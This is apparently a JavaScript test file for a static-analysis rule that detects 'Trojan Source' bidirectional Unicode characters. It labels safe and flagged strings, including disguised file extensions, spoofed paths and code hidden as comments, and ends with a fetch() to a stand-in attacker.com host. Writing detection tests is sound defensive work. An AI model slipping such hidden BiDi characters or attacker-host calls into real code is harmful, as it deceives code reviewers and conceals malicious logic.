// License: The GitLab Enterprise Edition (EE) license (the "EE License")

function testSafeCode() {
    // ok: generic_injection_rule-BiDiTrojanSource
    const normalVar = "Hello world";
    // ok: generic_injection_rule-BiDiTrojanSource
    const safeComment = "// This is a safe comment";
}

function testRLOAttack() {
    // ruleid: generic_injection_rule-BiDiTrojanSource
    const malicious = "Hello‮ world";  // RLO (U+202E)
    
    // ruleid: generic_injection_rule-BiDiTrojanSource
    const hidden = "console.log('Hello')‮ //Gotcha";  // RLO to hide code as comment
}

function testLROAttack() {
    // ruleid: generic_injection_rule-BiDiTrojanSource
    const reversed = "‭Reversed text";  // LRO (U+202D)
}

function testMultipleBidi() {
    // ruleid: generic_injection_rule-BiDiTrojanSource
    const text = "Start‪ middle‬ end";  // LRE (U+202A) and PDF (U+202C)
}

// ok: generic_injection_rule-BiDiTrojanSource
const safeVar = "This has no BiDi characters";

// ruleid: generic_injection_rule-BiDiTrojanSource
const bidiVar = "This has a BiDi‮ character";

// Hiding malicious extension
// ruleid: generic_injection_rule-BiDiTrojanSource
const hiddenFile = "document؜.txt.exe"; 

// Manipulating path display
// ruleid: generic_injection_rule-BiDiTrojanSource
const hiddenPath = "safe_folder‎/‏malicious"; 

// Hiding code logic
function checkCondition() {
  // ruleid: generic_injection_rule-BiDiTrojanSource
  const bidiString = "x ‎>‏ y"; // This will store the Bidi characters within the string
  if (bidiString) { // Using LRM and RLM to alter operator appearance
    // Malicious code here, e.g., 
    fetch('http://attacker.com/data')
      .then(response => response.json())
      .then(data => {
        // Execute malicious actions based on the received data
      });
  }
}
